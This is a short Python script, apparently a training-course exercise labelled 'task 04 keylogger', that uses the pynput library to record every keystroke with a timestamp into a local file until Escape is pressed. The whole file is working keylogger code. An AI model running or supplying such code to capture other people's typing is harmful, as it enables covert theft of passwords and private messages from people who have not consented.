#task 04
#keylogger
#PRODIGY_CS_04
#sahil sharma
from pynput import keyboard
from datetime import datetime

# Define the path where the keystrokes will be saved
log_file = "keylog.txt"

def on_press(key):
    try:
        # Get the current time
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Write the timestamp and key to the file
        with open(log_file, "a") as f:
            f.write(f"{timestamp} - {key.char}\n")
    except AttributeError:
        # Handle special keys (e.g., space, enter, etc.)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(log_file, "a") as f:
            f.write(f"{timestamp} - [{key}]\n")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the listener when the escape key is pressed
        return False

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
